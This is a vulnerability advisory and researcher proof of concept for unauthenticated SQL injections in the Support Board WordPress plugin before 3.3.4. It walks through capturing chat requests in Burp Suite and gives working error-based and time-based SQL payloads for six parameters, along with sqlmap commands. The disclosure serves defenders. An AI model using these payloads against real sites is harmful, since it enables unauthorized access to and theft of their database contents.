## WordPress Plugin Vulnerabilities

# Support Board < 3.3.4 - Multiple Unauthenticated SQL Injections

### Description

The plugin does not escape multiple POST parameters (such as status\_code, department, user\_id, conversation\_id, conversation\_status\_code, and recipient\_id) before using them in SQL statements, leading to SQL injections which are exploitable by unauthenticated users.

### Proof of Concept

The login-cookie parameter is needed, but does not require to be logged in.

# Multiple SQL Injection (Unauthenticated) in Support Board v 3.3.3

Summary:

Support Board is a wordpress plugin that helps you automate your customers communication with artificial intelligence driven bots and a chat system integrated with the most used platform.

So While doing Penetration testing on Support Board I’ve found Multiple SQL Injection Points in Support Board version 3.3.3 which allows remote unauthenticated attackers to execute arbitrary SQL Command via (status\_code, department, user\_id, conversation\_id, conversation\_status\_code, and recipient\_id)

SQL Injection:
SQL injection is a web security vulnerability that allows an attacker to alter the SQL queries made to the database. This can be used to retrieve some sensitive information, like database structure, tables, columns, and their underlying data.

Here are the Vulnerable parameters that i’ve found on Support Board version 3.3.3

![]()
## POC for every Parameters

we need to send a message to the chat system and intercept the request using burpsuite

![]()

send a hello message in the chat system

after intercepting we need to forward and forward the request until we found the function named **“new-conversation”** and we are going to forward to our repeater

![]()

Found function=new-conversation

now we found our new-conversation function we are going to send it into repeater and go back to proxy tab to intercept the second request we are going to forward and forward it again to find the function named **“send-message”**

![]()

send-message function found

now we are going to forward it to repeater again so we will have 2 tabs in repeater which consists of the function **“new-conversation”** and **“send-message”**

***New Conversation Function***

# **PoC for status code parameter**

payload

```
"+AND+EXTRACTVALUE(4597,CONCAT("","""+DB:+",(SELECT+(ELT(4597=4597,""))),database()))+AND+"fKoo"="fKoo
```

adding the payload to the status\_code parameter and sending the request

![]()

request sent

so the response of this request is the database name

![]()

response recieved with database name

# **PoC for deparment parameter**

payload

```
(UPDATEXML(5632,CONCAT(0x2e,"Database+Name:+",(SELECT+(ELT(5632=5632,""))),database()),3004))
```

adding the payload to the department parameter and sending the request

![]()

request sent

so the response of this request is the database name

![]()

response recieved with database name

Now we are going to the **send-message** function, to exploit the user\_id and conversation\_id parameters

***Send Message Function***

# PoC for user\_id parameter

payload

```
"+AND+GTID_SUBSET(CONCAT("Database+Name:+",(SELECT+(ELT(3919=3919,""))),database()),3919)+AND+"wrOJ"="wrOJ
```

adding the payload to the user\_id parameter and sending the request

![]()

request sent

so the response of this request is the database name

![]()

response recieved with database name

# PoC for conversation\_id parameter

payload

```
"+AND+(SELECT 1479+FROM+(SELECT(SLEEP(5)))xttx)--+BOXv
```

we are going to use sql map for exploiting Time Based, so we are going to save the request from the repeater to as a req file then use sqlmap to scan the request to find the conversation\_id parameter is vulnerable to time based

```
sqlmap -r req
```
![]()

as you can see conversation\_id is vulnerable

![]()
# PoC for conversation\_status\_code parameter

payload

```
WHERE+9793=9793+AND+(SELECT+4500+FROM+(SELECT(SLEEP(5)))oJCl)--+uAGp
```

we are going to use sql map for exploiting Time Based, so we are going to save the request from the repeater to as a req file then use sqlmap to scan the request to find the conversation\_id parameter is vulnerable to time based

```
sqlmap -r req
```
![]()

as you can see conversation\_status\_code is vulnerable

![]()
# PoC for recipient\_id parameter

payload

```
AND+(SELECT+7416+FROM+(SELECT(SLEEP(5)))eBhm)
```

we are going to use sql map for exploiting Time Based, so we are going to save the request from the repeater to as a req file then use sqlmap to scan the request to find the conversation\_id parameter is vulnerable to time based

```
sqlmap -r req
```
![]()

as you can see recipient\_id is vulnerable

![]()
